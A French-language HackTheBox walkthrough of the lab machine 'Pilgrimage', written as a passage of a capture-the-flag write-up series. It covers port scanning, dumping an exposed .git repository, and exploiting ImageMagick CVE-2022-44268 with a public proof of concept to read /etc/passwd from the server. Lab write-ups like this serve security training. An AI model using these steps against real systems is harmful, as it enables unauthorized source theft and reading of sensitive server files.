---
title:  "HacktheBox WriteUp : Pilgrimage"
category: HackTheBox
tag: writeups
---

### Scanner le réseau

`sudo nmap 10.10.11.219 -sV -A`

On voit qu'il y a le port 22 et 80 d'ouvert. On énumère un peu plus.


```console
┌──(misoko㉿kali)-[~]
└─$ nmap -n -p22,80 -sV -sC 10.10.11.219
Starting Nmap 7.92 ( https://nmap.org ) at 2023-10-29 10:52 CET
Nmap scan report for 10.10.11.219
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

On ajoute l'adresse au `/etc/hosts`.
```console
echo "10.10.11.219 pilgrimage.htb" | sudo tee -a /etc/hosts
```

On visite le site web, et pendant ce temps là on énumère sur le nom de domaine :
```console
┌──(misoko㉿kali)-[~]
└─$ gobuster dir -u http://pilgrimage.htb/ --wordlist /usr/share/dirb/wordlists/common.txt

...
/.hta                 (Status: 403) [Size: 153]
/.htaccess            (Status: 403) [Size: 153]
/.git/HEAD            (Status: 200) [Size: 23]
/.htpasswd            (Status: 403) [Size: 153]
/assets               (Status: 301) [Size: 169] [--> http://pilgrimage.htb/assets/]
/index.php            (Status: 200) [Size: 7621]
/tmp                  (Status: 301) [Size: 169] [--> http://pilgrimage.htb/tmp/]
/vendor               (Status: 301) [Size: 169] [--> http://pilgrimage.htb/vendor/]
```

Le path au `.git` m'interpelle.
On récupère le fichier `HEAD` qui contient un texte :
```console
└─$ cat HEAD      
ref: refs/heads/master
```

On télécharge le contenu qu'il y a à ce path :
```console
└─$ wget -r http://pilgrimage.htb/.git/refs/heads/master
```

On retrouve un fichier dans `master`, rien d'autres d'intéressants mis à part ça pour l'instant :

```console
┌──(misoko㉿kali)-[~/…/pilgrimage.htb/.git/refs/heads]
└─$ cat master 
e1a40beebc7035212efdcb15476f9c994e3634a7
```

On utilise le tool [git-dumper](https://github.com/arthaud/git-dumper?source=post_page-----9e070a99ac40--------------------------------) :
```
python3 git_dumper.py http://pilgrimage.htb/.git git
```

<img src="/assets/images/WriteUps/HackTheBox/Pilgrimage/gitdumper.png" width="300px" height="40px" style="display: block; margin: 0 auto"/>


On observe dans le code source de `index.php` une ligne de code qui nous donne le nom de l'outil utiliser pour réduire la taille de l'image :
<img src="/assets/images/WriteUps/HackTheBox/Pilgrimage/codeIndex.png" width="500px" height="40px" style="display: block; margin: 0 auto"/>
On récupère la version de l'outil et on trouve un exploit sur google (CVE-2022-44268) avec un [POC](https://github.com/voidz0r/CVE-2022-44268).
<img src="/assets/images/WriteUps/HackTheBox/Pilgrimage/versionMagick.png" width="200px" height="40px" style="display: block; margin: 0 auto"/>

### Utilisation de la CVE
```console
cargo run "/etc/passwd"
```
Puis on uplaod l'image sur le site, et on récupère l'image en output fourni par pilgrimage.htb.

```console
─$ identify -verbose 653e443922a9c.png
```
<img src="/assets/images/WriteUps/HackTheBox/Pilgrimage/DecryptedEtcPasswd.png" width="600px" height="100px" style="display: block; margin: 0 auto"/>

### Ref
- [git-dumper](https://github.com/arthaud/git-dumper?source=post_page-----9e070a99ac40--------------------------------)